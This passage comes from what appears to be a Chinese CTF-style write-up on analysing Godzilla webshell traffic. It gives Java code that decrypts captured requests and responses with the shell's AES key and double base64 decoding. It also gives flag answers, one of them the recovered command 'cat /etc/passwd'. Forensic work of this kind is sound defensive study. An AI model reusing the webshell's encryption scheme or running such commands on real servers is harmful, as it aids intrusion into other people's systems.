+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">test</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">class</span> <span class="nc">X</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">ClassLoader</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="nf">X</span><span class="p">(</span><span class="n">ClassLoader</span><span class="w"> </span><span class="n">z</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kd">super</span><span class="p">(</span><span class="n">z</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="n">Class</span><span class="w"> </span><span class="nf">Q</span><span class="p">(</span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">cb</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kd">super</span><span class="p">.</span><span class="na">defineClass</span><span class="p">(</span><span class="n">cb</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">cb</span><span class="p">.</span><span class="na">length</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">md5</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">java</span><span class="p">.</span><span class="na">security</span><span class="p">.</span><span class="na">MessageDigest</span><span class="w"> </span><span class="n">m</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">m</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">security</span><span class="p">.</span><span class="na">MessageDigest</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="s">&#34;MD5&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">m</span><span class="p">.</span><span class="na">update</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="na">getBytes</span><span class="p">(),</span><span class="w"> </span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">length</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">math</span><span class="p">.</span><span class="na">BigInteger</span><span class="p">(</span><span class="n">1</span><span class="p">,</span><span class="w"> </span><span class="n">m</span><span class="p">.</span><span class="na">digest</span><span class="p">()).</span><span class="na">toString</span><span class="p">(</span><span class="n">16</span><span class="p">).</span><span class="na">toUpperCase</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="nf">x</span><span class="p">(</span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="n">m</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">xc</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">javax</span><span class="p">.</span><span class="na">crypto</span><span class="p">.</span><span class="na">Cipher</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">javax</span><span class="p">.</span><span class="na">crypto</span><span class="p">.</span><span class="na">Cipher</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="s">&#34;AES&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">c</span><span class="p">.</span><span class="na">init</span><span class="p">(</span><span class="n">m</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">1</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">2</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">javax</span><span class="p">.</span><span class="na">crypto</span><span class="p">.</span><span class="na">spec</span><span class="p">.</span><span class="na">SecretKeySpec</span><span class="p">(</span><span class="n">xc</span><span class="p">.</span><span class="na">getBytes</span><span class="p">(),</span><span class="w"> </span><span class="s">&#34;AES&#34;</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">c</span><span class="p">.</span><span class="na">doFinal</span><span class="p">(</span><span class="n">s</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">base64Encode</span><span class="p">(</span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">bs</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">base64</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">base64</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;java.util.Base64&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Object</span><span class="w"> </span><span class="n">Encoder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">base64</span><span class="p">.</span><span class="na">getMethod</span><span class="p">(</span><span class="s">&#34;getEncoder&#34;</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">).</span><span class="na">invoke</span><span class="p">(</span><span class="n">base64</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="w"> </span><span class="n">Encoder</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getMethod</span><span class="p">(</span><span class="s">&#34;encodeToString&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="w"> </span><span class="p">}).</span><span class="na">invoke</span><span class="p">(</span><span class="n">Encoder</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">bs</span><span class="w"> </span><span class="p">});</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">base64</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.misc.BASE64Encoder&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Object</span><span class="w"> </span><span class="n">Encoder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">base64</span><span class="p">.</span><span class="na">newInstance</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="w"> </span><span class="n">Encoder</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getMethod</span><span class="p">(</span><span class="s">&#34;encode&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="w"> </span><span class="p">}).</span><span class="na">invoke</span><span class="p">(</span><span class="n">Encoder</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">bs</span><span class="w"> </span><span class="p">});</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e2</span><span class="p">)</span><span class="w"> </span><span class="p">{}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">value</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="nf">base64Decode</span><span class="p">(</span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">bytes</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">base64</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">decoder</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">base64</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;java.util.Base64&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">decoder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">base64</span><span class="p">.</span><span class="na">getMethod</span><span class="p">(</span><span class="s">&#34;getDecoder&#34;</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">).</span><span class="na">invoke</span><span class="p">(</span><span class="n">base64</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">byte</span><span class="o">[]</span><span class="p">)</span><span class="w"> </span><span class="n">decoder</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getMethod</span><span class="p">(</span><span class="s">&#34;decode&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="kt">byte</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">}).</span><span class="na">invoke</span><span class="p">(</span><span class="n">decoder</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="n">bytes</span><span class="p">});</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">base64</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.misc.BASE64Decoder&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">decoder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">base64</span><span class="p">.</span><span class="na">newInstance</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">byte</span><span class="o">[]</span><span class="p">)</span><span class="w"> </span><span class="n">decoder</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getMethod</span><span class="p">(</span><span class="s">&#34;decodeBuffer&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">}).</span><span class="na">invoke</span><span class="p">(</span><span class="n">decoder</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="p">(</span><span class="n">bytes</span><span class="p">)});</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">value</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">xc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;9adbe0b3033881f8&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">pass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;mypass&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">md5</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">md5</span><span class="p">(</span><span class="n">pass</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">xc</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Scanner</span><span class="w"> </span><span class="n">scanner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Scanner</span><span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="na">in</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;请输入URL编码的字符串：&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">BufferedReader</span><span class="w"> </span><span class="n">reader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">BufferedReader</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">InputStreamReader</span><span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="na">in</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">encodedString</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">reader</span><span class="p">.</span><span class="na">readLine</span><span class="p">();</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">decodedString</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">URLDecoder</span><span class="p">.</span><span class="na">decode</span><span class="p">(</span><span class="n">encodedString</span><span class="p">,</span><span class="w"> </span><span class="n">StandardCharsets</span><span class="p">.</span><span class="na">UTF_8</span><span class="p">.</span><span class="na">toString</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        System.out.println(&#34;URL解码后的字符串：&#34; + decodedString);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">scanner</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">base64Decode</span><span class="p">(</span><span class="n">decodedString</span><span class="p">.</span><span class="na">getBytes</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">base64Decode</span><span class="p">(</span><span class="n">data</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="p">(</span><span class="n">data</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">x</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="n">xc</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileOutputStream</span><span class="w"> </span><span class="n">fos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;res1.zip&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">fos</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">res</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">fos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>响应解密脚本，主要是少了一次base64</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">        </span><span class="n">Scanner</span><span class="w"> </span><span class="n">scanner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Scanner</span><span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="na">in</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;请输入URL编码的字符串：&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">encodedString</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">scanner</span><span class="p">.</span><span class="na">nextLine</span><span class="p">();</span><span class="w"> </span><span class="c1">// 获取用户输入的字符串</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">scanner</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">base64Decode</span><span class="p">(</span><span class="n">encodedString</span><span class="p">.</span><span class="na">getBytes</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="p">(</span><span class="n">bytes</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">x</span><span class="p">(</span><span class="n">bytes</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="n">xc</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileOutputStream</span><span class="w"> </span><span class="n">fos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;res2.zip&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">fos</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">res</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">fos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>解密出来是一个zip压缩包，解压后丢到010即可</p>
+<p><img loading="lazy" src="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727833370078-20241002094253-j9bmxai.png" alt="QQ_1727833370078" srcset="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727833370078-20241002094253-j9bmxai.png?size=small, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727833370078-20241002094253-j9bmxai.png?size=medium 1.5x, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727833370078-20241002094253-j9bmxai.png?size=large 2x" data-title="QQ_1727833370078" style="--width: 1526px;--aspect-ratio: 1526 / 610;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>flag{cat /etc/passwd}</p>
+<h2 id="5这个木马是根据哪个参数进行回显的提交参数名" class="heading-element"><span>5、这个木马是根据哪个参数进行回显的？（提交参数名）</span>
+  <a href="#5%e8%bf%99%e4%b8%aa%e6%9c%a8%e9%a9%ac%e6%98%af%e6%a0%b9%e6%8d%ae%e5%93%aa%e4%b8%aa%e5%8f%82%e6%95%b0%e8%bf%9b%e8%a1%8c%e5%9b%9e%e6%98%be%e7%9a%84%e6%8f%90%e4%ba%a4%e5%8f%82%e6%95%b0%e5%90%8d" class="heading-mark">
